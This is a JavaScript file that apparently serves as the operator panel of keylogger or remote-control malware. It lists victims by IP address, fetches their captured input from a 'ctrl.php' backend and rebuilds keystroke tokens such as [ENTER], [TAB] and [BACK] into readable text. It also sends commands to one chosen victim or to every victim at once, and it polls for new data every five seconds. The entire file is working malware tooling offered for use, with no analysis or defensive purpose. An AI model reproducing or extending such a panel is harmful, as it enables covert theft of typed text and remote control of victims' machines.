
var ctrl = 'ctrl.php';

var l_users = [];
var l_times = [];
var l_selected = -1;

var $selected_user = null;
var $users = null;
var $cmd = null;
var $cmds = null;
var $data = null;
var $log = null;
var $run_selected = null;

var $mode_text = null;
var $mode_color = null;
var $mode_linebreaks = null;

function oncheck_text() {
	select_user(l_selected);
}
function oncheck_color() {
	select_user(l_selected);
}
function oncheck_linebreaks() {
	select_user(l_selected);
}

function convert_mode_text(txt) {
	txt = txt.replace(/\[ENTER\]/g, '\n');
	txt = txt.replace(/\[TAB\]/g, '\t');
	txt = txt.replace(/\[BACK\]/g, 'ы');
	txt = txt.replace(/\[.*?\]/g, '');

	while (true) {
		var pos = txt.indexOf('ы');
		if (pos == -1) {
			break;
		} else if (pos == 0) {
			txt = txt.slice(1);
		} else {
			txt = txt.slice(0, pos-1) + txt.slice(pos + 1);
		}
	}
	
	return txt;
}
function convert_mode_color(txt) {
	txt = txt.replace(/\[(.*?)\]/g, '<span class="tc">[$1]</span>');
	return txt;
}
function convert_mode_linebreaks(txt) {
	txt = txt.replace(/\;/g, ';\n');
	return txt;
}
function log(msg) {
	$log.get(0).value += msg + '\n';
	$log.scrollTop($log[0].scrollHeight);
}
function set_data(data) {
	if ($mode_text.is(':checked')) {
		data = convert_mode_text(data);
	}
	if ($mode_color.is(':checked')) {
		data = convert_mode_color(data);
	}
	$data.val(data);
}
function set_cmds(data) {
	if ($mode_linebreaks.is(':checked')) {
		data = convert_mode_linebreaks(data);
	}
	$cmds.val(data);
}
function refresh_users() {

	select_user(-1);

	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'json',
		data: {req : 'get_users'}
	})
	.done(function(data) {
		l_users = [];
		l_times = [];
		$users.empty();
		for (var i = 0; i < data.length; i++) {
			l_users.push(data[i][0]);
			l_times.push(data[i][1]);
			$users.append($('<tr></tr>')
				.append('<td><button onclick="select_user('+i+');">Select</button></td>')
				.append('<td><button onclick="select_user('+i+');">' + l_users[i] + '</button></td>')
				.append('<td>' + l_times[i] + '</td>')
				//.append('<td><button onclick="get_data('+i+')">Show Data</button></td>')
				//.append('<td><button onclick="view_cmds('+i+')">View Commands</button></td>')
				.append('<td><button onclick="clear_data('+i+')">Clear Data</button></td>')
				.append('<td><button onclick="clear_cmds('+i+')">Clear Commands</button></td>')
				.append('<td><button onclick="del_data('+i+')">Delete User</button></td>'));
		}
		log('Fetched ' + l_users.length + ' IP addresses.');
	});
}

function select_user(index) {
	l_selected = index;
	
	$users.find('tr').removeClass('highlight');
	
	if (index < 0) {
		$run_selected.attr('disabled', 'disabled');
		$data.val('');
		$cmds.val('');
	} else {
		$users.find('tr').eq(index).addClass('highlight');
		$run_selected.text('Run for ' + l_users[index]).removeAttr('disabled');
		get_data(index);
		view_cmds(index);
	}
}
function get_data(index) {
	generic_request(index, 'get_data', function(data) {
		set_data(data);
		//$data.scrollTop($data[0].scrollHeight);
		log('Fetched data for ' + l_users[index]);
	});
}
function clear_data(index) {
	generic_request(index, 'clear_data', function(data) {
		log('Cleared data for ' + l_users[index]);
		if (l_selected == index) {
			$data.val('');
		}
	});
}
function view_cmds(index) {
	generic_request(index, 'get_cmd', function(data) {
		set_cmds(data);
		//$cmds.scrollTop($cmds[0].scrollHeight);
		log('Fetched commands for ' + l_users[index]);
	});
}
function clear_cmds(index) {
	generic_request(index, 'clear_cmd', function(data) {
		log('Cleared commands for ' + l_users[index]);
		if (l_selected == index) {
			$cmds.val('');
		}
	});
}
function del_data(index) {
	if(!confirm('Are you sure?'))
		return;

	generic_request(index, 'del_data', function(data) {
		log('Deleted data for ' + l_users[index]);
		if (l_selected == index) {
			$data.val('');
			$cmds.val('');
		}
		refresh_users();
	});
}
function generic_request(index, req, success) {
	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'text',
		data: {req : req, user: l_users[index]}
	})
	.done(success);
}
function run_all() {
	run(-1);
}
function run_selected() {
	if (l_selected < 0) {
		$data.val('No user selected.');
	} else {
		run(l_selected);
	}
}
function run(index) {
	var cmd = $cmd.val();
	if (cmd.length == 0)
		return;
		
	$cmd.val('');
	
	var data = null;
	if (index < 0) {
		data = {req : 'put_cmd_all', cmd: cmd};
	} else {
		data = {req : 'put_cmd', cmd: cmd, user: l_users[index]};
	}
	
	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'text',
		data: data
	})
	.done(function(data) {
		if (index < 0) {
			log('Executed command for ALL.');
		} else {
			log('Executed command for ' + l_users[index]);
			if (l_selected == index) {
				select_user(index);
			}
		}
	});
}

$(document).ready(function() {
	$selected_user = $('#selected_user');
	$users = $('#users');
	$cmd = $('#cmd');
	$data = $('#data');
	$cmds = $('#cmds');
	$log = $('#log');
	$run_selected = $('#run_selected');
	$mode_text = $('#mode_text');
	$mode_color = $('#mode_color');
	$mode_linebreaks = $('#mode_linebreaks');
	
	refresh_users();
	
	setInterval(function() {
		if (l_selected >= 0) {
			select_user(l_selected);
		}
	}, 5000);
});